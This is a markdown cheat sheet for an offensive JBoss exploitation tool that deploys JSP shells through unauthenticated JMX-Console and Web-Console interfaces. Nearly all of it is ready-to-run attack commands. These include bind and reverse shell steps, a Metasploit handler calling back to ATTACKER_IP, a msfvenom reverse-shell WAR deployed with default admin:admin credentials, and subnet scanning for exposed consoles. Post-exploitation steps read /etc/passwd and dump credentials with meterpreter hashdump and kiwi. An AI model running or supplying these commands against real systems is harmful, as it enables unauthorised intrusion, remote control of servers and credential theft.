# jboss-autopwn CHEATSHEET

## Overview
JBoss exploitation framework — deploys JSP shells via JMX-Console/Web-Console to gain OS-level access.

## Quick Start

```bash
# Linux target
./e.sh <target_ip> <port> 2>/dev/null

# Windows target
./e2.sh <target_ip> <port> 2>/dev/null
```

## Attack Flow

1. Retrieve cookie → 2. Create BSH script → 3. Build WAR → 4. Deploy → 5. Execute id/uname → 6. Upload payload → 7. Connect

## Prerequisites Check

```bash
# Verify target has JMX-Console exposed
curl -s -o /dev/null -w "%{http_code}" http://TARGET:8080/jmx-console/
# Returns 200 = vulnerable

# Check Web-Console
curl -s -o /dev/null -w "%{http_code}" http://TARGET:8080/web-console/
```

## Linux Exploitation

```bash
# Bind shell
./e.sh 192.168.1.100 8080 2>/dev/null
# Select: bind → Port: 31337
nc -v 192.168.1.100 31337

# Reverse shell
# Terminal 1: nc -lvnp 31337
# Terminal 2:
./e.sh 192.168.1.100 8080 2>/dev/null
# Select: reverse → Port: 31337
```

## Windows Exploitation

```bash
# Bind shell
./e2.sh 192.168.1.225 8080 2>/dev/null
# Select: bind → Port: 31337

# Reverse shell
./e2.sh 192.168.1.225 8080 2>/dev/null
# Select: reverse → Port: 31337
# Start msf handler within 20s:
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 31337; run"

# VNC
./e2.sh 192.168.1.225 8080 2>/dev/null
# Select: vnc → Port: 5900
```

## Post-Exploitation

```bash
# Stabilize shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Enumerate
uname -a
id
cat /etc/passwd
find /opt/jboss -name "*.properties" 2>/dev/null

# Windows post-exploit
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all
```

## Nmap Discovery

```bash
# Find JBoss instances
nmap -sV -p 8080,8443,443 192.168.1.0/24 | grep -i "jboss\|JBoss"

# JBoss-specific NSE scripts
nmap --script http-jboss-len-info -p 8080 192.168.1.100
```

## Batch Scanning

```bash
for i in $(seq 1 254); do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://192.168.1.$i:8080/jmx-console/" --connect-timeout 2)
    [ "$CODE" = "200" ] && echo "[+] 192.168.1.$i JMX-Console exposed"
done
```

## Dependencies

```bash
apt install netcat-openbsd curl metasploit-framework
```

## Metasploit Alternative (Modern)

```bash
# If msfcli/msfpayload unavailable, use msfvenom:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f war -o shell.war

# Deploy manually via curl
curl -u admin:admin -X POST --data-binary @shell.war \
  http://192.168.1.100:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.deployment:type=DeploymentScanner&methodName=scan&argType=java.lang.String&arg0=/tmp/shell.war
```

## WAF / Defense Bypass

```bash
# Test if JMX-Console requires auth
curl -I http://192.168.1.100:8080/jmx-console/
# 401 = auth required (exploit won't work without creds)
# 200 = no auth (vulnerable)
```

## Default Ports

| Service | Port |
|---------|------|
| JBoss HTTP | 8080 |
| JBoss HTTPS | 8443 |
| JBoss AJP | 8009 |
| JMX-Console | /jmx-console/ |
| Web-Console | /web-console/ |

## Key Paths

| Path | Description |
|------|-------------|
| `/jmx-console/HtmlAdaptor` | JMX management interface |
| `/web-console/` | Web management console |
| `/invoker/JMXInvokerServlet` | Deserialization endpoint |
| `/invoker/EJBInvokerServlet` | EJB deserialization |
| `/jmx-console/` | Default deployment target |

## Shell Upgrade

```bash
# From raw shell to full TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
# In target shell:
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 40 columns 120
```

## Quick Reference Table

| Target | Script | Payload | Listener |
|--------|--------|---------|----------|
| Linux | `e.sh` | bind_tcp | `nc -v TARGET PORT` |
| Linux | `e.sh` | reverse_tcp | `nc -lvnp PORT` |
| Windows | `e2.sh` | bind_tcp | msfconsole handler |
| Windows | `e2.sh` | reverse_tcp | msfconsole handler |
| Windows | `e2.sh` | vnc | vncviewer |
